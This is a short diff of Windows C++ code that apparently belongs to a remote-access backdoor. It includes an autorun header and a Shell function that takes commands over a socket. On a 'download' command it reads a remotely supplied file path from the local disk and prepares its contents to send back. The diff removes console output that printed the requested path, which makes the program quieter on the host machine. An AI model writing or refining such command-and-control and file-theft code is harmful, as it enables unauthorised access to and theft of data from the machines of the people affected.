@@ -11,7 +11,7 @@
 #include <winsock2.h>
 #include <fstream>
 #include <string>
-#include <iostream>
+
 
 #include "Autorun.h"
 #include "Config.h"
@@ -207,7 +207,7 @@ int Shell(SOCKADDR_IN addr) {
 		else if (!strcmp(buffer, "download")) {
 			recv(conn, path, sizeof(path), NULL);
 			std::ifstream d_file(path);
-			std::cout << "path: " << path;
+
 			if (!d_file.is_open()) send(conn, "exist", 5, NULL);
 			else {
 				std::string file_data = readFile(path);
